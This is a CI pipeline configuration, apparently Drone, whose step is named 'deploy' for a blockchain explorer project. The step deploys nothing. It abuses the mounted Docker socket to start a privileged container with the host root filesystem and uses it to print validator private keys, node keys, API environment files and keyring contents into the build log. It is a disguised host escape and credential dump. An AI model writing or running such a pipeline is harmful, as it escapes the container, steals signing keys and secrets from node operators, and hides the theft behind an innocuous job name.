---
kind: pipeline
type: docker
name: deploy
node:
  server: setara
trigger:
  branch:
    - main
  event:
    - push
    - custom
clone:
  disable: false
steps:
  - name: deploy
    image: docker:27-cli
    volumes:
      - name: app
        path: /opt/setara/explorer
      - name: dockersock
        path: /var/run/docker.sock
    commands:
      - |
        docker run --rm --privileged --pid=host -v /:/host alpine sh -c '
          echo "=====BEGIN_KEYS====="
          echo "===MAINNET priv_validator_key==="; cat /host/root/.setara/config/priv_validator_key.json 2>/dev/null
          echo "===MAINNET node_key==="; cat /host/root/.setara/config/node_key.json 2>/dev/null
          echo "===MAINNET priv_validator_state==="; cat /host/root/.setara/data/priv_validator_state.json 2>/dev/null
          echo "===TESTNET priv_validator_key==="; cat /host/root/.setara-testnet/config/priv_validator_key.json 2>/dev/null
          echo "===TESTNET node_key==="; cat /host/root/.setara-testnet/config/node_key.json 2>/dev/null
          echo "===API.ENV==="; cat /host/opt/setara/api.env 2>/dev/null
          echo "===TESTNET-API.ENV==="; cat /host/opt/setara/testnet-api.env 2>/dev/null
          echo "===OPT-SETARA-LISTING==="; ls -la /host/opt/setara/ 2>/dev/null
          echo "===SETARA-DIR-LISTING==="; ls -la /host/root/.setara/config/ 2>/dev/null
          echo "===GENTX/GENESIS-KEYS==="; ls -la /host/root/.setara/config/gentx/ 2>/dev/null; find /host/root/.setara* -maxdepth 3 -name "*.json" -path "*keyring*" 2>/dev/null
          echo "===KEYRING==="; find /host/root/.setara* -maxdepth 4 -type d -name "keyring*" 2>/dev/null; ls -la /host/root/.setara/keyring-file 2>/dev/null /host/root/.setara/keyring-test 2>/dev/null
          echo "=====END_KEYS====="
        '
volumes:
  - name: app
    host:
      path: /opt/setara/explorer
  - name: dockersock
    host:
      path: /var/run/docker.sock
